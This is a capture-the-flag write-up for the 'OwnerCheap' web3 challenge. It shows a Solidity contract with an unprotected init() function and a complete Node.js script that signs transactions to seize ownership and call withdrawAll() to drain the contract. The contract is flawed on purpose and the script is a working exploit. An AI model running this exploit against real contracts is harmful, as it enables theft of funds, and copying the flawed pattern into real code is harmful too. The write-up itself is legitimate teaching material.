# OwnerCheap - web3

## Challenge

We get one challenge contract and its address, and want to get all value of it out of the contract. We also receive a account (including private key) on the chain which we can use to sign transactions.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.1;
contract Challenge {

	bool setup = false;
	address payable owner = payable(address(0x0));
	mapping(address => bool) public sameAddress;
	
	constructor() payable {
		if( sameAddress[address(0x0)] ) {
			init(); 
		}
	}

	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
	
	function init() public {
		if( setup == false){ 
			setup = true;
			owner = payable(msg.sender);
		}
	}
	
	function withdrawAll() public onlyOwner {
		owner.transfer(address(this).balance);
	}
	
	function destroy() public onlyOwner {
		selfdestruct(owner);
	}
}
```

## Solution

as the mapping is intialized to 0, the init() function is not called in the constructor. So you can just call this function yourself, overwrite the owner and drain the contract. Example script can be found below.


```
const Web3 = require('web3');
const abi = require('./abi.json');

const privateKey = '0xedbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3';
const account = '0x133756e1688E475c401d1569565e8E16E65B1337';
const contractAddress = '0x874f54e755ec1e2a9ea083bd6d9c89148cea34d4';
const recipientAddress = '0x133756e1688E475c401d1569565e8E16E65B1337';
const rpcUrl = 'https://ownercheap.insomnihack.ch:32792';

const web3 = new Web3(rpcUrl);
const contract = new web3.eth.Contract(abi, contractAddress);

async function init() {
const nonce = await web3.eth.getTransactionCount(account);
const gasPrice = await web3.eth.getGasPrice();

const functionAbi = contract.methods.init().encodeABI();

const txParams = {
to: contractAddress,
data: functionAbi,
gasPrice: gasPrice,
gas: 100000, // Add the gas parameter with a value of your choice
nonce: nonce
};

const signedTx = await web3.eth.accounts.signTransaction(txParams, privateKey);
const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
console.log(`Transaction Hash: ${txReceipt.transactionHash}`);
}

async function withdrawAll(recipient) {
const nonce = await web3.eth.getTransactionCount(account);
const gasPrice = await web3.eth.getGasPrice();

const functionAbi = contract.methods.withdrawAll().encodeABI();

const txParams = {
to: contractAddress,
data: functionAbi,
gasPrice: gasPrice,
gas: 100000, // Add the gas parameter with a value of your choice
nonce: nonce
};

const signedTx = await web3.eth.accounts.signTransaction(txParams, privateKey);
const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
console.log(`Transaction Hash: ${txReceipt.transactionHash}`);
}

async function initAndWithdrawAll(recipient) {
await init();
await withdrawAll(recipient);
}

initAndWithdrawAll(recipientAddress);

```

Just run this script and get the flag.